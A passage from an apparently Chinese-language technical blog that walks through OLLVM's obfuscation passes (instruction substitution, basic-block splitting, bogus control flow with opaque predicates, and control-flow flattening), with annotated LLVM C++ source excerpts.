会为每个基本块生成一个唯一的 blockID，用于后续的跳转控制。这个 blockID 通常是一个随机数，可以增加混淆的复杂度，使得控制流更加难以预测。 保存所有基本块 通过遍历程序的所有基本块，将它们保存到一个列表或数组中。基本块（Basic Block）是程序中的一个代码段，它没有跳转指令，程序的控制流从一个基本块跳转到另一个基本块。 将 switch 改为 if OLLVM 会通过将所有的 switch 语句转换为 if 语句，进一步增加程序的控制流复杂性。这是为了去掉直接的分支跳转，使得每个分支都通过 if 语句进行控制。 删除第一个基本块并进行特殊处理 第一个基本块通常会被认为是程序的入口点。为了增强混淆，OLLVM 会删除第一个基本块，替换为其他复杂的分发逻辑，使得程序的开始部分不再直接可见。 识别 main 中的 if 语句并删除跳转指令 OLLVM 会识别 main 函数中的所有 if 语句，并删除原始的跳转指令。然后，它会插入新的跳转指令，控制程序流程。 插入一个 switch 指令 为了进一步混淆控制流，OLLVM 会插入一个新的 switch 指令。这个 switch 指令将用于根据条件决定程序执行的路径，而不是直接依赖 if 语句中的跳转。 第一个块跳转到 loopEntry 块 将程序的第一个基本块（已经被删除和替换）设置为跳转到一个新的块 loopEntry，开始控制流的平坦化。loopEntry 块将充当程序控制流的入口点，协调后续的跳转。 将所有基本块保存到 switch 语句中 所有的基本块会被保存到 switch 语句的不同分支中，使得程序的控制流不再是线性的，而是根据某个条件在不同的基本块之间跳转。 重新计算 switch 变量的值 为了控制程序的跳转，OLLVM 会重新计算 switch 指令中使用的变量的值。这通常是通过计算某个随机值或基于程序状态的值来决定的。这个变量的值将决定程序的实际执行路径。 处理非条件跳转 对于那些非条件跳转（如直接跳转到其他基本块的 goto 或 jump），OLLVM 会删除原来的跳转指令，并将其替换为指向 loopEnd 块的跳转指令。loopEnd 块是一个循环结束点，所有非条件跳转最终都会跳转到这个点进行下一轮的循环。 处理条件跳转 对于原本的条件跳转，OLLVM 会重新安排其分支执行逻辑。具体而言： 真分支：如果条件判断为真，则选择真分支的 blockID。 假分支：如果条件判断为假，则选择假分支的 blockID。 这一步骤通过修改条件判断的逻辑，使得程序的控制流变得更加复杂。 源码阅读站在巨人的肩膀上，网上已经有很多大佬分析，自己再跟着分析一遍。文件在&#x2F;home&#x2F;cruve&#x2F;tools&#x2F;ollvm&#x2F;obfuscator&#x2F;lib&#x2F;Transforms&#x2F;Obfuscation Substitution指令替换Substitution::runOnFunction检测是否需要进行混淆，是则进入混淆 12345678910111213141516bool Substitution::runOnFunction(Function &amp;F) &#123; //检查是否设置了有效的混淆次数 if (ObfTimes &lt;= 0) &#123; errs()&lt;&lt;&quot;Substitution application number -sub_loop=x must be x &gt; 0&quot;; return false; &#125; Function *tmp = &amp;F; //判断是否需要对当前函数进行混淆操作 if (toObfuscate(flag, tmp, &quot;sub&quot;)) &#123; substitute(tmp); return true; &#125; return false;&#125; substitute根据不同的运算符进行随机混淆 1234567891011121314151617181920212223242526272829303132333435bool Substitution::substitute(Function *f) &#123; Function *tmp = f; // 执行替换混淆操作的次数 int times = ObfTimes; do &#123; //第一个 for 循环遍历函数中的所有基本块,第二个 for 循环遍历当前基本块中的所有指令 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) &#123; for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) &#123; //检查当前指令是否是二元操作符 if (inst-&gt;isBinaryOp()) &#123; //根据指令的操作符类型（getOpcode() 返回操作符类型）进入不同的分支 switch (inst-&gt;getOpcode()) &#123; case BinaryOperator::Add: //随机选择一个加法替换函数，然后对当前指令进行替换。 (this-&gt;*funcAdd[llvm::cryptoutils-&gt;get_range(NUMBER_ADD_SUBST)])( cast&lt;BinaryOperator&gt;(inst)); ++Add; break; case BinaryOperator::Sub: //如果是减法操作 (Sub)，则从 funcSub 数组中随机选择一个减法替换函数进行替换，并增加 Sub 计数器。 (this-&gt;*funcSub[llvm::cryptoutils-&gt;get_range(NUMBER_SUB_SUBST)])( cast&lt;BinaryOperator&gt;(inst)); ++Sub; break; ... default: break; &#125; // End switch &#125; // End isBinaryOp &#125; // End for basickblock &#125; // End for Function &#125; while (--times &gt; 0); // for times return false;&#125; addNeg实现了对加法指令的替换，具体将 加法操作（a = b + c） 转换为等效的操作 **a = b - (-c)**。 12345678910111213void Substitution::addNeg(BinaryOperator *bo) &#123; BinaryOperator *op = NULL; //首先检查传入的二元操作指令 bo 是否为 Add 类型 if (bo-&gt;getOpcode() == Instruction::Add) &#123; //使用 CreateNeg 函数生成一条新的指令，对 bo 的第二个操作数（c）进行取负操作，结果是 -c op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo); //使用 Create 函数生成一个新的减法指令，用第一操作数 b 减去上一步计算的 -c，结果是 b - (-c)，即原来的加法 b + c。 op =BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo); //将原指令 bo 的所有使用替换为新创建的减法指令 op。 bo-&gt;replaceAllUsesWith(op); &#125;&#125; … SplitBasicBlocks拆分顾名思义，将一个大的基本块拆分成多个较小的基本块 SplitBasicBlock::runOnFunction123456789101112131415161718bool SplitBasicBlock::runOnFunction(Function &amp;F) &#123; //防止用户配置了无效的 SplitNum 参数，避免无效的拆分操作 if (!((SplitNum &gt; 1) &amp;&amp; (SplitNum &lt;= 10))) &#123; errs()&lt;&lt;&quot;Split application basic block percentage\\ -split_num=x must be 1 &lt; x &lt;= 10&quot;; return false; &#125; Function *tmp = &amp;F; // 决定是否进行拆 if (toObfuscate(flag, tmp, &quot;split&quot;)) &#123; split(tmp); ++Split; &#125; return false;&#125; split12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455void SplitBasicBlock::split(Function *f) &#123; std::vector&lt;BasicBlock *&gt; origBB; int splitN = SplitNum; //保存所有基本块 for (Function::iterator I = f-&gt;begin(), IE = f-&gt;end(); I != IE; ++I) &#123; origBB.push_back(&amp;*I); &#125; //遍历基本块 for (std::vector&lt;BasicBlock *&gt;::iterator I = origBB.begin(), IE = origBB.end(); I != IE; ++I) &#123; BasicBlock *curr = *I; //跳过特殊基本块（指令数&lt;2的基本块和存在phi的基本块） //PHI节点用来表示从不同的前驱基本块中接收的值 if (curr-&gt;size() &lt; 2 || containsPHI(curr)) &#123; continue; &#125; // 确保拆分次数合法 if ((size_t)splitN &gt; curr-&gt;size()) &#123; splitN = curr-&gt;size() - 1; &#125; // 生成拆分点，创建一个 std::vector&lt;int&gt; test，它保存当前基本块中所有可能的拆分点 std::vector&lt;int&gt; test; for (unsigned i = 1; i &lt; curr-&gt;size(); ++i) &#123; test.push_back(i); &#125; // 打乱拆分点：如果拆分点不止一个，使用 shuffle(test) 随机打乱拆分点的顺序。然后对前 splitN 个拆分点进行排序，确保拆分点的位置是有序的。 if (test.size() != 1) &#123; shuffle(test); std::sort(test.begin(), test.begin() + splitN); &#125; //执行基本块拆分 BasicBlock::iterator it = curr-&gt;begin();//初始化一个迭代器 it，它指向当前基本块的第一个指令。 BasicBlock *toSplit = curr;//将当前基本块赋给 toSplit，以便对其进行拆分。 int last = 0; for (int i = 0; i &lt; splitN; ++i) &#123; for (int j = 0; j &lt; test[i] - last; ++j) &#123; ++it; &#125; last = test[i]; if(toSplit-&gt;size() &lt; 2)//拆分前检查 continue; //调用 splitBasicBlock 函数在拆分点 it 处拆分当前基本块。 toSplit = toSplit-&gt;splitBasicBlock(it, toSplit-&gt;getName() + &quot;.split&quot;); &#125; ++Split; &#125;&#125; splitBasicBlock函数将当前基本块拆分为两个基本块 在 LLVM 中，PHINode 用于处理基本块之间的控制流汇聚。当一个基本块有多个前驱基本块时，PHINode 用于选择从不同路径传来的值。 12345678910111213141516171819202122232425262728BasicBlock *BasicBlock::splitBasicBlock(iterator I, const Twine &amp;BBName) &#123; //检查当前基本块是否包含终结指令 assert(getTerminator() &amp;&amp; &quot;Can&#x27;t use splitBasicBlock on degenerate BB!&quot;); //确保分割点 I 有效 assert(I != InstList.end() &amp;&amp; &quot;Trying to get me to create degenerate basic block!&quot;); //创建新的基本块 BasicBlock *New = BasicBlock::Create(getContext(), BBName, getParent(), this-&gt;getNextNode()); //移动指令到新基本块 DebugLoc Loc = I-&gt;getDebugLoc(); New-&gt;getInstList().splice(New-&gt;end(), this-&gt;getInstList(), I, end());//将指令插入到新基本块的末尾 //将当前基本块跳转到新创建的基本块 New BranchInst *BI = BranchInst::Create(New, this); BI-&gt;setDebugLoc(Loc); //处理后继基本块的 PHI 节点 for (succ_iterator I = succ_begin(New), E = succ_end(New); I != E; ++I) &#123;//遍历 New 的后继基本块 BasicBlock *Successor = *I; PHINode *PN; //将当前指令转换为 PHINode，如果是 PHINode，则继续处理 for (BasicBlock::iterator II = Successor-&gt;begin(); (PN = dyn_cast&lt;PHINode&gt;(II)); ++II) &#123; int IDX = PN-&gt;getBasicBlockIndex(this);//获取当前基本块在 PHINode 中的索引位置。 while (IDX != -1) &#123; PN-&gt;setIncomingBlock((unsigned)IDX, New);//更新 PHI 节点的前驱块，将当前基本块的前驱更改为新的基本块。 IDX = PN-&gt;getBasicBlockIndex(this); &#125; &#125; &#125; return New;&#125; … BogusControlFlow 虚假控制流runOnFunction 混淆入口123456789101112131415161718192021virtual bool runOnFunction(Function &amp;F)&#123; //检查混淆次数是否有效 if (ObfTimes &lt;= 0) &#123; errs()&lt;&lt;&quot;BogusControlFlow application number -bcf_loop=x must be x &gt; 0&quot;; return false; &#125; // 检查混淆概率是否有效 if ( !((ObfProbRate &gt; 0) &amp;&amp; (ObfProbRate &lt;= 100)) ) &#123; errs()&lt;&lt;&quot;BogusControlFlow application basic blocks percentage -bcf_prob=x must be 0 &lt; x &lt;= 100&quot;; return false; &#125; //判断是否进行混淆 if(toObfuscate(flag,&amp;F,&quot;bcf&quot;)) &#123; bogus(F);//混淆函数 doF(*F.getParent());//进一步的处理 return true; &#125; return false; &#125; // end of runOnFunction() bogus 混淆逻辑1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950void bogus(Function &amp;F) &#123; //初始统计和调试信息 ++NumFunction; int NumBasicBlocks = 0; bool firstTime = true; // First time we do the loop in this function bool hasBeenModified = false; //... NumTimesOnFunctions = ObfTimes; int NumObfTimes = ObfTimes; // 主混淆逻辑 do&#123;//调试输出 CFG（控制流图）：在混淆前查看函数的基本块结构 DEBUG_WITH_TYPE(&quot;cfg&quot;, errs() &lt;&lt; &quot;bcf: Function &quot; &lt;&lt; F.getName()&lt;&lt;&quot;, before the pass:\\n&quot;); DEBUG_WITH_TYPE(&quot;cfg&quot;, F.viewCFG()); // 将当前函数的所有基本块保存到 basicBlocks 列表中，用于后续处理。 std::list&lt;BasicBlock *&gt; basicBlocks; for (Function::iterator i=F.begin();i!=F.end();++i) &#123; basicBlocks.push_back(&amp;*i); &#125; DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Iterating on the Function&#x27;s Basic Blocks\\n&quot;); //遍历所有基本块 while(!basicBlocks.empty())&#123; NumBasicBlocks ++; //根据 ObfProbRate 决定是否对当前基本块应用混淆 if((int)llvm::cryptoutils-&gt;get_range(100) &lt;= ObfProbRate)&#123; DEBUG_WITH_TYPE(&quot;opt&quot;, errs() &lt;&lt; &quot;bcf: Block &quot;&lt;&lt; NumBasicBlocks &lt;&lt;&quot; selected. \\n&quot;); hasBeenModified = true; ++NumModifiedBasicBlocks; NumAddedBasicBlocks += 3; FinalNumBasicBlocks += 3; // Add bogus flow to the given Basic Block (see description) BasicBlock *basicBlock = basicBlocks.front(); //调用 addBogusFlow，对基本块插入假的控制流。 addBogusFlow(basicBlock, F); &#125; else&#123; DEBUG_WITH_TYPE(&quot;opt&quot;, errs() &lt;&lt; &quot;bcf: Block &quot;&lt;&lt; NumBasicBlocks &lt;&lt;&quot; not selected.\\n&quot;); &#125; // remove the block from the list basicBlocks.pop_front(); if(firstTime)&#123; // 如果是第一次处理当前函数，初始化基本块计数器。 ++InitNumBasicBlocks; ++FinalNumBasicBlocks; &#125; &#125; // end of while(!basicBlocks.empty()) ... firstTime = false; &#125;while(--NumObfTimes &gt; 0);&#125; addBogusFlow对基本块插入假的控制流1virtual void addBogusFlow(BasicBlock * basicBlock, Function &amp;F)&#123; 在basicBlock基本快和其原后续块之间插入新块originalBB 123456789101112 BasicBlock::iterator i1 = basicBlock-&gt;begin();//找到 basicBlock 的首个非 PHI、调试信息或生命周期信息的指令（getFirstNonPHIOrDbgOrLifetime）。 if(basicBlock-&gt;getFirstNonPHIOrDbgOrLifetime()) i1 = (BasicBlock::iterator)basicBlock-&gt;getFirstNonPHIOrDbgOrLifetime(); Twine *var; var = new Twine(&quot;originalBB&quot;);//调用 splitBasicBlock 将 basicBlock 拆分成两部分：//第一部分只保留前置的 PHI 节点和调试信息。//第二部分包含剩余的指令。//originalBB 是拆分出的新基本块，保留原始的执行逻辑。 BasicBlock *originalBB = basicBlock-&gt;splitBasicBlock(i1, *var); DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: First and original basic blocks: ok\\n&quot;); 调用 createAlteredBasicBlock 创建一个伪造的基本块 alteredBB。删除basicblock和alteredBB指向后续块的指令 12345678Twine * var3 = new Twine(&quot;alteredBB&quot;);BasicBlock *alteredBB = createAlteredBasicBlock(originalBB, *var3, &amp;F);DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Altered basic block: ok\\n&quot;); //删除伪造块和原始块的旧终止指令，为插入新的分支逻辑做准备alteredBB-&gt;getTerminator()-&gt;eraseFromParent();basicBlock-&gt;getTerminator()-&gt;eraseFromParent();DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Terminator removed from the altered&quot;&lt;&lt;&quot; and first basic blocks\\n&quot;); 创建伪造的条件，插入虚假分支逻辑 在basicblock基本快后面插入一个永远跳入oringalBB的Fcmp条件跳转， 另外一跳指向alteredBB，并且alterBB结束指向originalBB，而originalBB指向我们basicblock原先的后继基本块 1234567891011121314151617//创建两个值用于后续的比较指令Value * LHS = ConstantFP::get(Type::getFloatTy(F.getContext()), 1.0);Value * RHS = ConstantFP::get(Type::getFloatTy(F.getContext()), 1.0);DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Value LHS and RHS created\\n&quot;);// 创建一个伪造的浮点比较指令 condition，始终返回 trueTwine * var4 = new Twine(&quot;condition&quot;);FCmpInst * condition = new FCmpInst(*basicBlock, FCmpInst::FCMP_TRUE , LHS, RHS, *var4);DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Always true condition created\\n&quot;);// 在 basicBlock 的末尾插入条件分支：若 condition 为真，则跳转到 originalBB。否则跳转到 alteredBB（实际上总是跳到 originalBB）。BranchInst::Create(originalBB, alteredBB, (Value *)condition, basicBlock);DEBUG_WITH_TYPE(&quot;gen&quot;,errs() &lt;&lt; &quot;bcf: Terminator instruction in first basic block: ok\\n&quot;);// 在 alteredBB 的末尾插入回到 originalBB 的无条件分支。BranchInst::Create(originalBB, alteredBB);DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Terminator instruction in altered block: ok\\n&quot;); 拆分 originalBB 基本块，将终结指令移到新创建的 originalBBpart2 基本块中。 在 originalBB 的末尾添加一个总是为 true 的条件比较指令（FCmpInst）。 基于该条件，创建一个分支指令跳转到 originalBBpart2（ture） 和 alteredBB（false），从而增加控制流的复杂度，形成伪控制流。 在 originalBB 中删除原有的终结指令，替换为新的分支指令，进一步增加代码的混淆。 12345678910111213141516171819 //始化了一个iterator，该迭代器指向 originalBB 的末尾 BasicBlock::iterator i = originalBB-&gt;end(); //将 originalBB 基本块从倒数第二个指令（--i）处拆分为两个基本块。 新的基本块名为originalBBpart2 Twine * var5 = new Twine(&quot;originalBBpart2&quot;); BasicBlock * originalBBpart2 = originalBB-&gt;splitBasicBlock(--i , *var5); DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Terminator part of the original basic block&quot;&lt;&lt; &quot; is isolated\\n&quot;); //删除了 originalBB 中的终结指令 originalBB-&gt;getTerminator()-&gt;eraseFromParent(); //再次创建一个 Twine 对象，用于为下一个条件判断创建一个标签（&quot;condition2&quot;） Twine * var6 = new Twine(&quot;condition2&quot;); //这行代码创建了一个 FCmpInst（浮动点比较指令），它比较两个常量浮点数 LHS 和 RHS，并且使用 FCMP_TRUE（即总是为 true）作为比较操作。 FCmpInst * condition2 = new FCmpInst(*originalBB, CmpInst::FCMP_TRUE , LHS, RHS, *var6);//这表示该条件始终为真 //创建了一个分支指令（BranchInst），它基于条件 condition2 来决定跳转目标，分支指令会被添加到 originalBB 的末尾，作为新的终结指令 BranchInst::Create(originalBBpart2, alteredBB, (Value *)condition2, originalBB); DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Terminator original basic block: ok\\n&quot;); DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: End of addBogusFlow().\\n&quot;);&#125; createAlteredBasicBlock函数 克隆基本块 12345virtual BasicBlock* createAlteredBasicBlock(BasicBlock * basicBlock,const Twine &amp; Name = &quot;gen&quot;, Function * F = 0)&#123; // llvm::CloneBasicBlock 将原始的 basicBlock 克隆成一个新的基本块 alteredBB ValueToValueMapTy VMap; BasicBlock * alteredBB = llvm::CloneBasicBlock (basicBlock, VMap, Name, F); DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Original basic block cloned\\n&quot;); 对克隆基本块中的指令、Phi前驱块、元数据和调试信息进行正确的重新映射，确保克隆后的基本块在语义上与原始基本块一致 12345678910111213141516171819202122232425262728293031323334353637//ji 是指向原始基本块开始位置的迭代器。 BasicBlock::iterator ji = basicBlock-&gt;begin();//遍历克隆基本块中的所有指令。e 是克隆基本块的末尾迭代器，表示循环结束的条件。 for (BasicBlock::iterator i = alteredBB-&gt;begin(), e = alteredBB-&gt;end() ; i != e; ++i)&#123; // 每条指令都有一个或多个操作数，遍历当前指令 i 的所有操作数 for(User::op_iterator opi = i-&gt;op_begin (), ope = i-&gt;op_end(); opi != ope; ++opi)&#123; // 根据映射表 VMap 查找和返回当前操作数的映射值 Value *v = MapValue(*opi, VMap, RF_None, 0); //如果 MapValue 返回非空值，则表示操作数已经成功映射 if (v != 0)&#123; *opi = v; DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Value&#x27;s operand has been setted\\n&quot;); &#125; &#125; DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Operands remapped\\n&quot;); // 重新映射 Phi 节点的前驱块 if (PHINode *pn = dyn_cast&lt;PHINode&gt;(i)) &#123;//判断当前指令是否为 PHINode //则遍历该 Phi 节点的所有前驱块 for (unsigned j = 0, e = pn-&gt;getNumIncomingValues(); j != e; ++j) &#123; //重新映射 Phi 节点的前驱块 Value *v = MapValue(pn-&gt;getIncomingBlock(j), VMap, RF_None, 0); if (v != 0)&#123; pn-&gt;setIncomingBlock(j, cast&lt;BasicBlock&gt;(v)); &#125; &#125; &#125; DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: PHINodes remapped\\n&quot;); //重新映射指令的元数据 SmallVector&lt;std::pair&lt;unsigned, MDNode *&gt;, 4&gt; MDs; i-&gt;getAllMetadata(MDs); DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Metadatas remapped\\n&quot;); //重新设置调试信息 i-&gt;setDebugLoc(ji-&gt;getDebugLoc()); ji++; DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Debug information location setted\\n&quot;); &#125; 添加垃圾代码 在克隆后的基本块中插入“垃圾代码”。这部分代码会随机地在每个二进制操作（如加法、减法、乘法等）中插入一些额外的运算，或者在条件比较（ICmp 或 FCmp）中进行修改。这些插入的操作会增加控制流的复杂性，制造出伪装的效果。 对于整数和浮点操作，代码根据随机数的值决定是否插入额外的指令，例如在加法、减法等基础操作中插入额外的运算（例如取负、加法、乘法等）。 对于条件比较（ICmp 和 FCmp），代码也会随机改变比较操作符或交换操作数，进一步增加了控制流的复杂性。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133 DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: The cloned basic block is now correct\\n&quot;); DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Starting to add junk code in the cloned bloc...\\n&quot;); // 遍历基本块中的指令 for (BasicBlock::iterator i = alteredBB-&gt;begin(), e = alteredBB-&gt;end() ; i != e; ++i)&#123; // 如果指令是运算指令，进行垃圾指令添加 if(i-&gt;isBinaryOp())&#123; // binary instructions unsigned opcode = i-&gt;getOpcode(); BinaryOperator *op, *op1 = NULL; Twine *var = new Twine(&quot;_&quot;); // treat differently float or int // Binary int if(opcode == Instruction::Add || opcode == Instruction::Sub || opcode == Instruction::Mul || opcode == Instruction::UDiv || opcode == Instruction::SDiv || opcode == Instruction::URem || opcode == Instruction::SRem || opcode == Instruction::Shl || opcode == Instruction::LShr || opcode == Instruction::AShr || opcode == Instruction::And || opcode == Instruction::Or || opcode == Instruction::Xor)&#123; for(int random = (int)llvm::cryptoutils-&gt;get_range(10); random &lt; 10; ++random)&#123; switch(llvm::cryptoutils-&gt;get_range(4))&#123; // to improve case 0: //do nothing break; case 1: op = BinaryOperator::CreateNeg(i-&gt;getOperand(0),*var,&amp;*i); op1 = BinaryOperator::Create(Instruction::Add,op, i-&gt;getOperand(1),&quot;gen&quot;,&amp;*i); break; case 2: op1 = BinaryOperator::Create(Instruction::Sub, i-&gt;getOperand(0), i-&gt;getOperand(1),*var,&amp;*i); op = BinaryOperator::Create(Instruction::Mul,op1, i-&gt;getOperand(1),&quot;gen&quot;,&amp;*i); break; case 3: op = BinaryOperator::Create(Instruction::Shl, i-&gt;getOperand(0), i-&gt;getOperand(1),*var,&amp;*i); break; &#125; &#125; &#125; // Binary float if(opcode == Instruction::FAdd || opcode == Instruction::FSub || opcode == Instruction::FMul || opcode == Instruction::FDiv || opcode == Instruction::FRem)&#123; for(int random = (int)llvm::cryptoutils-&gt;get_range(10); random &lt; 10; ++random)&#123; switch(llvm::cryptoutils-&gt;get_range(3))&#123; // can be improved case 0: //do nothing break; case 1: op = BinaryOperator::CreateFNeg(i-&gt;getOperand(0),*var,&amp;*i); op1 = BinaryOperator::Create(Instruction::FAdd,op, i-&gt;getOperand(1),&quot;gen&quot;,&amp;*i); break; case 2: op = BinaryOperator::Create(Instruction::FSub, i-&gt;getOperand(0), i-&gt;getOperand(1),*var,&amp;*i); op1 = BinaryOperator::Create(Instruction::FMul,op, i-&gt;getOperand(1),&quot;gen&quot;,&amp;*i); break; &#125; &#125; &#125; if(opcode == Instruction::ICmp)&#123; // Condition (with int) ICmpInst *currentI = (ICmpInst*)(&amp;i); switch(llvm::cryptoutils-&gt;get_range(3))&#123; // must be improved case 0: //do nothing break; case 1: currentI-&gt;swapOperands(); break; case 2: // randomly change the predicate switch(llvm::cryptoutils-&gt;get_range(10))&#123; case 0: currentI-&gt;setPredicate(ICmpInst::ICMP_EQ); break; // equal case 1: currentI-&gt;setPredicate(ICmpInst::ICMP_NE); break; // not equal case 2: currentI-&gt;setPredicate(ICmpInst::ICMP_UGT); break; // unsigned greater than case 3: currentI-&gt;setPredicate(ICmpInst::ICMP_UGE); break; // unsigned greater or equal case 4: currentI-&gt;setPredicate(ICmpInst::ICMP_ULT); break; // unsigned less than case 5: currentI-&gt;setPredicate(ICmpInst::ICMP_ULE); break; // unsigned less or equal case 6: currentI-&gt;setPredicate(ICmpInst::ICMP_SGT); break; // signed greater than case 7: currentI-&gt;setPredicate(ICmpInst::ICMP_SGE); break; // signed greater or equal case 8: currentI-&gt;setPredicate(ICmpInst::ICMP_SLT); break; // signed less than case 9: currentI-&gt;setPredicate(ICmpInst::ICMP_SLE); break; // signed less or equal &#125; break; &#125; &#125; if(opcode == Instruction::FCmp)&#123; // Conditions (with float) FCmpInst *currentI = (FCmpInst*)(&amp;i); switch(llvm::cryptoutils-&gt;get_range(3))&#123; // must be improved case 0: //do nothing break; case 1: currentI-&gt;swapOperands(); break; case 2: // randomly change the predicate switch(llvm::cryptoutils-&gt;get_range(10))&#123; case 0: currentI-&gt;setPredicate(FCmpInst::FCMP_OEQ); break; // ordered and equal case 1: currentI-&gt;setPredicate(FCmpInst::FCMP_ONE); break; // ordered and operands are unequal case 2: currentI-&gt;setPredicate(FCmpInst::FCMP_UGT); break; // unordered or greater than case 3: currentI-&gt;setPredicate(FCmpInst::FCMP_UGE); break; // unordered, or greater than, or equal case 4: currentI-&gt;setPredicate(FCmpInst::FCMP_ULT); break; // unordered or less than case 5: currentI-&gt;setPredicate(FCmpInst::FCMP_ULE); break; // unordered, or less than, or equal case 6: currentI-&gt;setPredicate(FCmpInst::FCMP_OGT); break; // ordered and greater than case 7: currentI-&gt;setPredicate(FCmpInst::FCMP_OGE); break; // ordered and greater than or equal case 8: currentI-&gt;setPredicate(FCmpInst::FCMP_OLT); break; // ordered and less than case 9: currentI-&gt;setPredicate(FCmpInst::FCMP_OLE); break; // ordered or less than, or equal &#125; break; &#125; &#125; &#125; &#125; return alteredBB;&#125; doFdoF主要目的是将某些FCMP_TRUE（总为真）条件替换为复杂的伪谓词，从而提高代码的混淆性 使用了两个全局变量 x 和 y 来替代总是为 true 的条件，初始值为0， 12345678910111213141516bool doF(Module &amp;M)&#123; DEBUG_WITH_TYPE(&quot;gen&quot;, errs()&lt;&lt;&quot;bcf: Starting doFinalization...\\n&quot;); Twine * varX = new Twine(&quot;x&quot;); Twine * varY = new Twine(&quot;y&quot;); Value * x1 =ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false); Value * y1 =ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false); GlobalVariable * x = new GlobalVariable(M, Type::getInt32Ty(M.getContext()), false, GlobalValue::CommonLinkage, (Constant * )x1, *varX); GlobalVariable * y = new GlobalVariable(M, Type::getInt32Ty(M.getContext()), false, GlobalValue::CommonLinkage, (Constant * )y1, *varY); 查找和修改某些 FCMP_TRUE（总是为真的）条件，并将这些条件加入到toEdit中，以及将对应的永真比较指令加入到toDelete中。 1234567891011121314151617181920212223242526std::vector&lt;Instruction*&gt; toEdit, toDelete;//用于存储需要修改（toEdit）和删除（toDelete）的指令。BinaryOperator *op,*op1 = NULL;//用于存储二进制操作符指令的指针LoadInst * opX , * opY;//存储加载指令（加载变量的值）的指针ICmpInst * condition, * condition2;//存储条件比较指令// 遍历模块中的所有函数for(Module::iterator mi = M.begin(), me = M.end(); mi != me; ++mi)&#123; for(Function::iterator fi = mi-&gt;begin(), fe = mi-&gt;end(); fi != fe; ++fi)&#123; //查找并处理条件分支指令 TerminatorInst * tbb= fi-&gt;getTerminator();//获取终止指令。 if(tbb-&gt;getOpcode() == Instruction::Br)&#123;//检查该终止指令是否为 BranchInst（分支指令）。 BranchInst * br = (BranchInst *)(tbb); if(br-&gt;isConditional())&#123;//检查分支是否是条件跳转 FCmpInst * cond = (FCmpInst *)br-&gt;getCondition();//获取条件表达式 unsigned opcode = cond-&gt;getOpcode();//获取指令的操作符 if(opcode == Instruction::FCmp)&#123;////是FCmp指令 if (cond-&gt;getPredicate() == FCmpInst::FCMP_TRUE)&#123;//检查 FCmpInst::FCMP_TRUE 条件 DEBUG_WITH_TYPE(&quot;gen&quot;,errs()&lt;&lt;&quot;bcf: an always true predicate !\\n&quot;); toDelete.push_back(cond); // The condition toEdit.push_back(tbb); // The branch using the condition &#125; &#125; &#125; &#125; &#125;&#125; 对在 toEdit 列表中的每个分支指令进行处理,创建条件码x*(x-1)%2 == 0 || y &lt; 10，以该条件码创建条件跳转分支，然后删除之前的永真条件跳转指令。最后删除toDelete中存放的永真比较指令。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 //遍历toEdit中存放的永真条件跳转指令 for(std::vector&lt;Instruction*&gt;::iterator i =toEdit.begin();i!=toEdit.end();++i)&#123; //if y &lt; 10 || x*(x+1) % 2 == 0，加载全局变量 x 和 y： opX = new LoadInst ((Value *)x, &quot;&quot;, (*i)); opY = new LoadInst ((Value *)y, &quot;&quot;, (*i)); //x - 1 op = BinaryOperator::Create(Instruction::Sub, (Value *)opX, ConstantInt::get(Type::getInt32Ty(M.getContext()), 1, false), &quot;&quot;, (*i)); // x*(x-1) op1 = BinaryOperator::Create(Instruction::Mul, (Value *)opX, op, &quot;&quot;, (*i)); // x*(x-1)%2 op = BinaryOperator::Create(Instruction::URem, op1, ConstantInt::get(Type::getInt32Ty(M.getContext()), 2, false), &quot;&quot;, (*i)); // //创建条件码为 x*(x-1)%2 == 0 condition = new ICmpInst((*i), ICmpInst::ICMP_EQ, op, ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false)); // //创建条件码为 y &lt; 10 condition2 = new ICmpInst((*i), ICmpInst::ICMP_SLT, opY, ConstantInt::get(Type::getInt32Ty(M.getContext()), 10, false)); // x*(x-1)%2 == 0 || y &lt; 10 op1 = BinaryOperator::Create(Instruction::Or, (Value *)condition, (Value *)condition2, &quot;&quot;, (*i)); //// 创建条件跳转指令，ture进入第0个后继基本块，false进入第1个后继基本块，条件码为op1，即x*(x-1)%2 == 0 || y &lt; 10 BranchInst::Create(((BranchInst*)*i)-&gt;getSuccessor(0), ((BranchInst*)*i)-&gt;getSuccessor(1),(Value *) op1, ((BranchInst*)*i)-&gt;getParent()); 